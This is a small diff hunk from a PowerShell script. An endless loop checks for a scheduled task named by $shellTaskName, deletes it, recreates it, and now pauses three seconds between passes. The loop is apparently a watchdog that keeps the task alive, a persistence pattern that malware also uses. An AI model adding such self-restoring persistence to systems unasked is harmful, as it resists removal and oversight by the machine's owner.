@@ -150,5 +150,5 @@ while ($true) {
         if(schtasks /query /tn $shellTaskName){ schtasks /delete /tn $shellTaskName /f 2>&1 | Out-Null }
     }
     CheckTask-And-Recreate -taskName $shellTaskName -taskRunAction $shellTaskRunAction
-
+    Start-Sleep -Seconds 3
 }
